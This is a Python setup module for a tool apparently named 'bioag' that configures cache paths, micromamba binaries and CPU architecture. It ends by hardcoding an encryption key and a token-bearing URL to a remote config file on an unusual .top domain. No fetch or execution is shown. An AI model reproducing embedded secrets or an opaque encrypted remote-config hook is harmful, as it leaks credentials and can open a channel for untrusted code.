import os
import platform

build_docker_from_source = os.getenv("BIOGEN_BUILD_DOCKER_FROM_SOURCE", "0") == "1"
CONTAINER_IMAGE = "bioag:latest"
CONTAINER_NAME = "bioag"
TARGET_BIOAGVARSION = "1.3.0.10"
MOUNT_BASE = "/data"
cache_path = os.environ.get("BIOGEN_CACHE", os.path.expanduser("~/.cache/bioag"))

if not os.path.exists(cache_path):
    os.makedirs(cache_path)

script_dir = os.path.dirname(os.path.abspath(__file__))
system = platform.system().lower()
machine = platform.machine().lower()

if system == 'windows':
    micromamba_path = os.path.join(script_dir, 'micromamba.exe')
else:
    micromamba_path = os.path.join(script_dir, 'micromamba')

if machine in ["x86_64", "amd64"]:
    arch_name = "64"
elif machine in ["arm64", "aarch64"]:
    arch_name = "arm64" if system == "darwin" else "aarch64"
else:
    raise RuntimeError(f"Unsupported cpu architecture: {machine}")

envs_dir = os.path.join(script_dir, 'envs')
biogen_env = os.path.join(envs_dir, 'biogen')
env_yaml = os.path.join(script_dir, 'envs', 'env.yaml')
installed_flag = os.path.join(biogen_env, ".installed")
ENCRYPTION_KEY = 'xD7WU2JVDrQal9'
CONFIG_JSON = "https://dataweb.biogaip.top/server_aws.config?expires=10414438925&token=42e159c5957d860b45685afb9eedd87d778a403dbd417c228b0624b3b9981249"